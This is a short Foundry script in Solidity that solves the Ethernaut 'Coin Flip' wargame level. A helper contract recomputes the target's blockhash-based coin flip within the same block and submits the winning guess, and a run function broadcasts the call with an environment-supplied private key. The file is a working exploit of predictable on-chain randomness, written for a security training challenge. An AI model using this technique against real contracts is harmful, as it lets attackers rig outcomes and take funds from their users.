// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautL4} from "../src/EthernautL4.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Instance {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(EthernautL4 _ethernautl4) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        console.log("blockValue: %d", blockValue);
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        _ethernautl4.flip(side);
    }

}

contract EthernautL4Script is Script {
    EthernautL4 public ethernautl4 =
        EthernautL4(0xCcb7495349Bd884c26A86a0ca97cA17424DF5A7c);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Instance(ethernautl4);
        console.log("consecutiveWins: %d", ethernautl4.consecutiveWins());
        vm.stopBroadcast();
    }
}
